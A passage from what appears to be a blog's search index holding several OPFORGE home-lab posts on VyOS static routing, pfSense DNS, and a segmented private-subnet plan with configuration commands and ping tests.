denied packets now show proper rule association and help trace misconfigurations faster.\nüì¶ Snapshot Recommendation After completing this, I took snapshots of all active VMs under the OPFORGE Phase 1 - Routing + DNS Lock-in milestone. Recommend tagging all systems now that:\nDNS is resolvable per trust boundary NAT is applied only where required Static routes cover all isolated subnets pfSense rule logic is layered, traceable, and minimal üåü Key Takeaways Conditional DNS forwarding via pfSense links internal domain awareness with internet access Static routes across VyOS routers require clean design and bidirectional consideration Using multiple OS types validated cross-platform reliability of infrastructure üó∫ On Deck Begin Zeek deployment for passive DNS and connection monitoring Create DNS logging use cases to support detection engineering Implement DHCP reservations and test reverse lookup integration This milestone solidifies the foundational DNS and routing necessary for advanced OPFORGE testing. From here, the lab grows smarter.\nH.Y.P.R. ","permalink":"https://opforge.dev/posts/2025-06-19-post-6-routing-dns-success/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;It is not because things are difficult that we do not dare, it is because we do not dare that they are difficult.\u0026rdquo; \u003cbr\u003e\n‚Äî Seneca\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-routing--dns-success-across-the-opforge-lab\"\u003eüåê Routing + DNS Success Across the OPFORGE Lab\u003c/h1\u003e\n\u003cp\u003eIn this post, I walk through the successful validation of DNS and routing configurations across segmented OPFORGE networks. After implementing static routes, DNS forwarding, and conditional resolvers, systems across RED, DMZ, INT, and CSOC segments can now resolve \u003ccode\u003eopforge.local\u003c/code\u003e and route correctly.\u003c/p\u003e","title":"Post 6: Routing + DNS Success Across the OPFORGE Lab"},{"content":" \u0026ldquo;If you know the way broadly, you will see it in all things.\u0026rdquo; ‚Äî Miyamoto Musashi\n‚ú® DNS \u0026amp; Routing End-to-End This post captures the initial end-to-end routing and DNS resolution across segmented subnets in the OPFORGE lab. It enabled reliable communication across infrastructure zones and laid the groundwork for centralized visibility and detection.\nüìå Abstract Problem: The initial network configuration lacked reliable inter-segment routing and DNS resolution, limiting endpoint communication and visibility into host activity.\nApproach: Implement static routing across VyOS nodes and configure pfSense to serve DNS using its resolver. Validate communication paths from RED to DMZ to Internal zones.\nAlignment: Reinforces certification knowledge: CISSP (Network Architecture), GCFA (Log Source Centralization), GCFR (Infrastructure Mapping).\nOutcome: Endpoints now resolve domain names and reach targets across segments. Routing and DNS now mirror realistic enterprise networks.\nüìö Prerequisites opf-fw-dmz deployed with pfSense 2.7.2 VyOS routers (opf-rt-red, opf-rt-inet, opf-rt-ext, opf-rt-int) in position VMs attached to appropriate VMnet subnets Base interfaces and IPs assigned (see Post 4) ‚úÖ Tasks This Phase Set static routes on each VyOS router to reach adjacent zones Configure pfSense DNS Resolver to serve 192.168.x.x/24 ranges Test DNS resolution from RED, DMZ, and INT zones Validate TCP reachability (e.g., ping, curl, etc.) across routed hops üîß Configuration Summary VyOS (opf-rt-red) configure set protocols static route 192.168.30.0/24 next-hop 192.168.20.2 commit ; save VyOS (opf-rt-inet) configure set protocols static route 192.168.10.0/24 next-hop 192.168.20.1 set protocols static route 192.168.50.0/24 next-hop 192.168.30.2 commit ; save VyOS (opf-rt-ext) configure set protocols static route 192.168.60.0/24 next-hop 192.168.50.1 commit ; save VyOS (opf-rt-int) configure set protocols static route 192.168.30.0/24 next-hop 192.168.50.2 commit ; save pfSense (opf-fw-dmz) DNS Resolver: Enabled Network Interfaces: LAN, WAN Domain Overrides: none (using root hints) Firewall Rules: Allow port 53 UDP from internal zones üåü Key Takeaways Routing across multiple VyOS nodes provides granular control of east-west and north-south traffic pfSense\u0026rsquo;s DNS Resolver simplifies internal name resolution and supports visibility tools like Zeek and Suricata Proper route planning avoids asymmetric routing and visibility blind spots üõç On Deck Migrate to VLAN tagging for trunked segments Introduce Zeek and ELK for traffic analysis Begin integrating endpoint logging with Winlogbeat The OPFORGE lab continues to evolve into a trusted, validated cyber operations training ground where every emulation leaves a detection trail‚Äîby design.\nH.Y.P.R. ","permalink":"https://opforge.dev/posts/opforge_post_5_dns_route/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;If you know the way broadly, you will see it in all things.\u0026rdquo; ‚Äî Miyamoto Musashi\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-dns--routing-end-to-end\"\u003e‚ú® DNS \u0026amp; Routing End-to-End\u003c/h1\u003e\n\u003cp\u003eThis post captures the initial end-to-end routing and DNS resolution across segmented subnets in the OPFORGE lab. It enabled reliable communication across infrastructure zones and laid the groundwork for centralized visibility and detection.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-abstract\"\u003eüìå Abstract\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eProblem:\u003c/strong\u003e The initial network configuration lacked reliable inter-segment routing and DNS resolution, limiting endpoint communication and visibility into host activity.\u003c/p\u003e","title":"Post 5: DNS \u0026 Routing End-to-End"},{"content":" \u0026ldquo;In the midst of chaos, there is also opportunity.\u0026rdquo; ‚Äî Sun Tzu\n‚ú® Initial Connectivity ‚Äì Red to DMZ Validation This post captures the preliminary test to confirm routed communication between the Red Team subnet and the DMZ prior to full lab routing. It served as a necessary checkpoint to ensure that the segmented network was behaving as expected before DNS, NAT, and VLAN tagging were added.\nüìå Abstract Problem: With the new segmented topology in OPFORGE, we needed to verify that basic IP connectivity from RED ‚Üí DMZ was functional before layering on DNS and full routing.\nApproach: Use ICMP (ping), static routes, and interface-level validation to confirm reachability between opf-rt-red and opf-fw-dmz.\nCertifications Link: Supports CISSP domain on network architecture validation and OSCP red team tradecraft (initial foothold testing).\nOutcome: Red Team subnet confirmed to route to DMZ. Config validated and paved the way for full DNS and NAT implementation (see Post 5).\nüìö Prerequisites VyOS routers opf-rt-red, opf-rt-inet in place with basic IP addressing pfSense (opf-fw-dmz) online and reachable Interfaces assigned to VMnets: RED_NET (192.168.10.0/24) DMZ_NET (192.168.50.0/24) Static IPs assigned, firewall rules open for ICMP ‚úÖ Tasks This Phase Validate IP configuration on opf-rt-red, opf-rt-inet, and opf-fw-dmz Add temporary static routes to allow RED ‚Üí DMZ traversal Test ICMP traffic (ping) from RED subnet VM to DMZ interface Document any asymmetrical behavior or drop conditions üîß Configuration \u0026amp; Validation Temporary VyOS Static Route (opf-rt-red) configure set protocols static route 192.168.50.0/24 next-hop 192.168.20.2 commit ; save Firewall Rule (pfSense ‚Äì DMZ) Allow ICMP (IPv4) from 192.168.10.0/24 to 192.168.50.1 Test ping 192.168.50.1 üåü Key Takeaways Early connectivity testing prevents deeper troubleshooting pain later Small-scope tests build confidence before introducing NAT, DNS, or VLANs Observed ICMP traffic confirmed routes and firewall rules were properly aligned üß≠ On Deck Expand from single hop routing to full RED ‚Üí INT reachability Implement DNS Resolver and verify name resolution across segments (see Post 5) Migrate to tagged VLAN segmentation to reflect enterprise-grade architecture Every solid build starts with a solid handshake. One ping at a time.\nH.Y.P.R. ","permalink":"https://opforge.dev/posts/opforge_post_4_red_to_dmz./","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;In the midst of chaos, there is also opportunity.\u0026rdquo; ‚Äî Sun Tzu\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-initial-connectivity--red-to-dmz-validation\"\u003e‚ú® Initial Connectivity ‚Äì Red to DMZ Validation\u003c/h1\u003e\n\u003cp\u003eThis post captures the preliminary test to confirm routed communication between the Red Team subnet and the DMZ prior to full lab routing. It served as a necessary checkpoint to ensure that the segmented network was behaving as expected before DNS, NAT, and VLAN tagging were added.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-abstract\"\u003eüìå Abstract\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eProblem:\u003c/strong\u003e With the new segmented topology in OPFORGE, we needed to verify that basic IP connectivity from RED ‚Üí DMZ was functional before layering on DNS and full routing.\u003c/p\u003e","title":"Post 4: Initial Connectivity ‚Äì Red to DMZ Validation"},{"content":" \u0026ldquo;Order and simplification are the first steps toward mastery of a subject.\u0026rdquo; ‚Äî Thomas Mann\n‚ú® Foundational Segmentation Setup This post captures the introduction of initial segmentation boundaries within the OPFORGE lab. Before advanced VLAN tagging and DMZ logic, basic subnet design and routing were validated to support scalable infrastructure development.\nüìå Abstract Problem Statement: The original flat lab design limited control over traffic flow and security boundaries, making it unsuitable for advanced threat simulation or detection testing.\nMethodology: The network was segmented into dedicated subnets representing RED_NET, INT_NET, and DMZ_NET using VyOS routers. Static routes and basic firewall policies were used to simulate initial traffic controls.\nCertifications \u0026amp; Academic Link: This work aligns with CISSP (network architecture design) and OSCP (pivoting foundations). It sets up the groundwork for forensics and detection scenarios supported by GCFA and GCFR.\nExpected Outcomes: Defined network boundaries, validated communication pathways, and laid the groundwork for VLAN and DMZ transitions in future phases.\nüìö Prerequisites Familiarity with basic VyOS routing commands VMware configured with isolated VMnets for each subnet OPFORGE VMs placed into respective segments: opf-rt-red (Red Team router) opf-rt-inet (Transit router) opf-fw-dmz (DMZ firewall, pfSense base install) ‚úÖ Tasks This Phase Define IP schema for segmented subnets Deploy and validate initial VyOS configurations for routing Confirm interface-to-interface reachability via ICMP Ensure pfSense DMZ firewall interface responds to test probes üîß Configuration \u0026amp; Validation VyOS Routing Setup configure set interfaces ethernet eth0 address 192.168.10.1/24 set interfaces ethernet eth1 address 192.168.20.1/24 set protocols static route 192.168.50.0/24 next-hop 192.168.20.2 commit ; save pfSense Interface Setup em0 (connected to 192.168.20.0/24): assigned 192.168.20.2 em1 (DMZ): assigned 192.168.50.1/24 Test Command ping 192.168.50.1 üåü Key Takeaways Early subnet segmentation enables clean expansion into VLAN-aware setups VyOS proved effective for modular routing in lab networks Sanity checks like ICMP build confidence before adding complexity üß≠ On Deck Confirm bidirectional reachability through DMZ to INT_NET Begin DNS infrastructure deployment using pfSense DNS Resolver Start mapping segmentation logic to VLAN tagging and pfSense NAT A clean segmentation plan today avoids future rework and frustration.\nH.Y.P.R. ","permalink":"https://opforge.dev/posts/opforge_post_3_segmentation/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;Order and simplification are the first steps toward mastery of a subject.\u0026rdquo; ‚Äî Thomas Mann\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-foundational-segmentation-setup\"\u003e‚ú® Foundational Segmentation Setup\u003c/h1\u003e\n\u003cp\u003eThis post captures the introduction of initial segmentation boundaries within the OPFORGE lab. Before advanced VLAN tagging and DMZ logic, basic subnet design and routing were validated to support scalable infrastructure development.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-abstract\"\u003eüìå Abstract\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eProblem Statement:\u003c/strong\u003e The original flat lab design limited control over traffic flow and security boundaries, making it unsuitable for advanced threat simulation or detection testing.\u003c/p\u003e","title":"Post 3: Foundational Segmentation Setup"},{"content":"üéØ Goal Enforce logical traffic flow through each security zone in OPFORGE using a clearly segmented and rhymed IP scheme.\nRED_NET ‚Üí RTR_RED ‚Üí RTR_INET ‚Üí RTR_EXT ‚Üí FW_DMZ ‚Üí RTR_INT ‚Üí INTERNAL_NET üîê Subnet Allocation by Zone Zone/Link Subnet Mnemonic External Internet 192.168.1.0/24 1 = Origin RED_NET 192.168.10.0/24 10 = Tension RED ‚Üî INET Transit 192.168.20.0/24 20 = Handoff INET ‚Üî EXT Transit 192.168.30.0/24 30 = Throttle EXT ‚Üî DMZ Transit 192.168.40.0/24 40 = Border DMZ ‚Üî INTERNAL Transit 192.168.50.0/24 50 = Core Door INTERNAL_NET 192.168.60.0/24 60 = Fix-it Net üö¶ Expected IP Assignments Device Interface IP Address Connected To opf-rt-red eth0 192.168.10.1/24 RED_NET opf-rt-red eth1 192.168.20.1/24 opf-rt-inet opf-rt-inet eth0 192.168.20.2/24 opf-rt-red opf-rt-inet eth1 192.168.30.1/24 opf-rt-ext opf-rt-ext eth0 192.168.30.2/24 opf-rt-inet opf-rt-ext eth1 192.168.40.1/24 opf-fw-dmz (em0) opf-fw-dmz em0 192.168.40.2/24 opf-rt-ext opf-fw-dmz em1 192.168.50.1/24 opf-rt-int opf-rt-int eth0 192.168.50.2/24 opf-fw-dmz opf-rt-int eth1 192.168.60.1/24 INTERNAL_NET üß≠ Route Propagation (Examples) On opf-rt-red set protocols static route 192.168.60.0/24 next-hop 192.168.20.2 On opf-rt-inet set protocols static route 192.168.60.0/24 next-hop 192.168.30.2 On opf-rt-ext set protocols static route 192.168.60.0/24 next-hop 192.168.40.2 On opf-fw-dmz (pfSense CLI) route add -net 192.168.60.0/24 192.168.50.2 To persist:\necho \u0026#39;static_routes=\u0026#34;internalnet\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/rc.conf echo \u0026#39;route_internalnet=\u0026#34;-net 192.168.60.0/24 192.168.50.2\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/rc.conf.local ‚úÖ Benefits of This Design Memorable: Each subnet aligns with a ‚Äúrhyme‚Äù for mission role Traceable: Routes are easy to follow and describe Segmented: Forces all traffic through correct inspection points Scalable: Easily extend with 70.x, 80.x, etc for future zones üñºÔ∏è ASCII Diagram: Segmented Routing Overview [ Internet / WAN ] | +------v------+ RED_NET | opf-rt-inet |\u0026lt;----------------------------+ | 30.1 / 20.2 | | +------^------+ | | | +------v------+ | | opf-rt-red | | | 10.1 / 20.1 |---+ | +-------------+ | | | | +------v------+ | | opf-lnx01 | | | 10.10 | | +-------------+ | | +-------------+ | | opf-rt-ext |\u0026lt;---------------------------+ | 30.2 / 40.1 | +------+------+ DMZ_LINK | +------v------+ | opf-fw-dmz | | 40.2 / 50.1 | +------+------+ | +------v------+ | opf-rt-int |-----\u0026gt; [ INTERNAL_NET ] | 50.2 / 60.1 | +-------------+ Note: IPs shortened for clarity. Each zone uses a unique /24 subnet.\n‚öôÔ∏è Interface Configuration Commands (VyOS \u0026amp; pfSense) opf-rt-red set interfaces ethernet eth0 address \u0026#39;192.168.10.1/24\u0026#39; set interfaces ethernet eth1 address \u0026#39;192.168.20.1/24\u0026#39; set protocols static route 192.168.60.0/24 next-hop 192.168.20.2 commit; save opf-rt-inet set interfaces ethernet eth0 address \u0026#39;192.168.20.2/24\u0026#39; set interfaces ethernet eth1 address \u0026#39;192.168.30.1/24\u0026#39; set protocols static route 192.168.60.0/24 next-hop 192.168.30.2 commit; save opf-rt-ext set interfaces ethernet eth0 address \u0026#39;192.168.30.2/24\u0026#39; set interfaces ethernet eth1 address \u0026#39;192.168.40.1/24\u0026#39; set protocols static route 192.168.60.0/24 next-hop 192.168.40.2 commit; save opf-fw-dmz (pfSense CLI) ifconfig em0 inet 192.168.40.2 netmask 255.255.255.0 ifconfig em1 inet 192.168.50.1 netmask 255.255.255.0 route add -net 192.168.60.0/24 192.168.50.2 # Persist routes echo \u0026#39;static_routes=\u0026#34;internalnet\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/rc.conf echo \u0026#39;route_internalnet=\u0026#34;-net 192.168.60.0/24 192.168.50.2\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/rc.conf.local opf-rt-int set interfaces ethernet eth0 address \u0026#39;192.168.50.2/24\u0026#39; set interfaces ethernet eth1 address \u0026#39;192.168.60.1/24\u0026#39; commit; save ‚úÖ All routers are now aligned to the segmented architecture.\n","permalink":"https://opforge.dev/docs/opf_routing_segmented_rhymed/","summary":"\u003ch2 id=\"-goal\"\u003eüéØ Goal\u003c/h2\u003e\n\u003cp\u003eEnforce logical traffic flow through each security zone in OPFORGE using a clearly segmented and rhymed IP scheme.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eRED_NET ‚Üí RTR_RED ‚Üí RTR_INET ‚Üí RTR_EXT ‚Üí FW_DMZ ‚Üí RTR_INT ‚Üí INTERNAL_NET\n\u003c/code\u003e\u003c/pre\u003e\u003chr\u003e\n\u003ch2 id=\"-subnet-allocation-by-zone\"\u003eüîê Subnet Allocation by Zone\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eZone/Link\u003c/th\u003e\n          \u003cth\u003eSubnet\u003c/th\u003e\n          \u003cth\u003eMnemonic\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eExternal Internet\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e192.168.1.0/24\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e1 = Origin\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eRED_NET\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e192.168.10.0/24\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e10 = Tension\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eRED ‚Üî INET Transit\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e192.168.20.0/24\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e20 = Handoff\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eINET ‚Üî EXT Transit\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e192.168.30.0/24\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e30 = Throttle\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eEXT ‚Üî DMZ Transit\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e192.168.40.0/24\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e40 = Border\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eDMZ ‚Üî INTERNAL Transit\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e192.168.50.0/24\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e50 = Core Door\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eINTERNAL_NET\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e192.168.60.0/24\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e60 = Fix-it Net\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003chr\u003e\n\u003ch2 id=\"-expected-ip-assignments\"\u003eüö¶ Expected IP Assignments\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eDevice\u003c/th\u003e\n          \u003cth\u003eInterface\u003c/th\u003e\n          \u003cth\u003eIP Address\u003c/th\u003e\n          \u003cth\u003eConnected To\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-red\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eeth0\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.10.1/24\u003c/td\u003e\n          \u003ctd\u003eRED_NET\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-red\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eeth1\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.20.1/24\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-inet\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-inet\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eeth0\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.20.2/24\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-red\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-inet\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eeth1\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.30.1/24\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-ext\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-ext\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eeth0\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.30.2/24\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-inet\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-ext\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eeth1\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.40.1/24\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-fw-dmz\u003c/code\u003e (em0)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-fw-dmz\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eem0\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.40.2/24\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-ext\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-fw-dmz\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eem1\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.50.1/24\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-int\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-int\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eeth0\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.50.2/24\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-fw-dmz\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-rt-int\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eeth1\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e192.168.60.1/24\u003c/td\u003e\n          \u003ctd\u003eINTERNAL_NET\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003chr\u003e\n\u003ch2 id=\"-route-propagation-examples\"\u003eüß≠ Route Propagation (Examples)\u003c/h2\u003e\n\u003ch3 id=\"on-opf-rt-red\"\u003eOn \u003ccode\u003eopf-rt-red\u003c/code\u003e\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset protocols static route 192.168.60.0/24 next-hop 192.168.20.2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"on-opf-rt-inet\"\u003eOn \u003ccode\u003eopf-rt-inet\u003c/code\u003e\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset protocols static route 192.168.60.0/24 next-hop 192.168.30.2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"on-opf-rt-ext\"\u003eOn \u003ccode\u003eopf-rt-ext\u003c/code\u003e\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset protocols static route 192.168.60.0/24 next-hop 192.168.40.2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"on-opf-fw-dmz-pfsense-cli\"\u003eOn \u003ccode\u003eopf-fw-dmz\u003c/code\u003e (pfSense CLI)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroute add -net 192.168.60.0/24 192.168.50.2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eTo persist:\u003c/p\u003e","title":"OPFORGE Routing Plan: Rhymed Segmented Flow"},{"content":" \u0026ldquo;You must understand the whole of life, not just one little part of it. That is why you must read, look at the skies, sing, and dance.\u0026rdquo; ‚Äî Jiddu Krishnamurti\nüß† Routing the OPFORGE Lab This post outlines the implementation of static routing across segmented subnets in the OPFORGE lab using VyOS routers. With a baseline topology now established, we focus on connecting RED, INT, and DMZ zones through transit routers and validating initial east-west communication.\nüìå Abstract Problem Statement: Without clear routing logic, segmented subnets like RED_NET and DMZ_NET could not communicate securely. Static routing is necessary for simulating real-world traffic flows, Red Team movement, and Blue Team monitoring.\nMethodology: VyOS routers were configured to interconnect the RED, DMZ, and INT zones using static routes. The transit router (opf-rt-inet) serves as a hop point for cross-subnet flows. Each zone maintains routing awareness without using a dynamic protocol like OSPF, making the behavior predictable and testable.\nCertifications \u0026amp; Academic Link: This phase aligns with CISSP (Network Security Architecture) and OSCP (internal pivoting). It supports GCFA/GCFR use cases by enabling data path tracking.\nExpected Outcomes: Enable reachability across segments, support future firewall and NAT rules, and establish a platform for Zeek and Winlogbeat traffic logging.\nüìö Prerequisites VMware Workstation with at least 3 VMnets assigned Basic working knowledge of VyOS CLI OPFORGE VM deployment with: opf-rt-red: handles RED_NET traffic opf-rt-inet: middlebox router opf-fw-dmz: terminates DMZ zone ‚úÖ Tasks This Phase Assign IP addresses to interfaces across three routers Configure static routes to interconnect RED, INT, and DMZ Use ICMP to verify reachability between zones Confirm that routers can reach pfSense for future gateway testing üîß Configuration \u0026amp; Validation VyOS: opf-rt-red configure set interfaces ethernet eth0 address 192.168.10.1/24 set interfaces ethernet eth1 address 192.168.20.1/24 set protocols static route 192.168.50.0/24 next-hop 192.168.20.2 commit ; save VyOS: opf-rt-inet configure set interfaces ethernet eth0 address 192.168.20.2/24 set interfaces ethernet eth1 address 192.168.30.1/24 set protocols static route 192.168.10.0/24 next-hop 192.168.20.1 set protocols static route 192.168.50.0/24 next-hop 192.168.30.2 commit ; save pfSense: opf-fw-dmz em0 = 192.168.30.2 (connected to opf-rt-inet) em1 = 192.168.50.1 (DMZ firewall interface) Test from opf-rt-red:\nping 192.168.50.1 üåü Key Takeaways Static routing between zones allows deliberate control over flow paths Intermediate routing via opf-rt-inet simplifies NAT and monitoring Routing logic sets the foundation for firewall and segmentation work üß≠ On Deck Confirm DNS configuration from RED to DMZ Expand DMZ services to include NGINX and Zeek sensor nodes Begin VLAN testing and pfSense NAT scenarios A lab without routing is just a group of strangers on different subnets. We build bridges.\nH.Y.P.R. ","permalink":"https://opforge.dev/posts/opforge_post_2_routing/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;You must understand the whole of life, not just one little part of it. That is why you must read, look at the skies, sing, and dance.\u0026rdquo; ‚Äî Jiddu Krishnamurti\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-routing-the-opforge-lab\"\u003eüß† Routing the OPFORGE Lab\u003c/h1\u003e\n\u003cp\u003eThis post outlines the implementation of static routing across segmented subnets in the OPFORGE lab using VyOS routers. With a baseline topology now established, we focus on connecting RED, INT, and DMZ zones through transit routers and validating initial east-west communication.\u003c/p\u003e","title":"Post 2: Routing the OPFORGE Lab"},{"content":" \u0026ldquo;First say to yourself what you would be; and then do what you have to do.\u0026rdquo; ‚Äî Epictetus\nüöÄ Genesis of OPFORGE The launch of OPFORGE marks the deliberate beginning of a long-range effort to build a portfolio-driven, enterprise-grade cyber operations lab. This post documents the rationale, guiding principles, and initial actions to set up the OPFORGE lab environment using VMware Workstation Pro.\nüìå Abstract Problem Statement: Many cyber professionals lack a personalized, practical testbed to validate tools, emulate adversaries, and showcase capabilities. OPFORGE fills that gap through structured lab design.\nMethodology: This phase established foundational infrastructure: created core VM folders, downloaded initial VM images, and structured network segmentation to support growth.\nCertifications \u0026amp; Academic Link: This project supports CISSP (security architecture), OSCP (hands-on exploitation testbed), and forms the environment for future GCFA/GCFR forensics testing.\nExpected Outcomes: Establish base VM structure, logical folder organization, and prepare for segmentation and 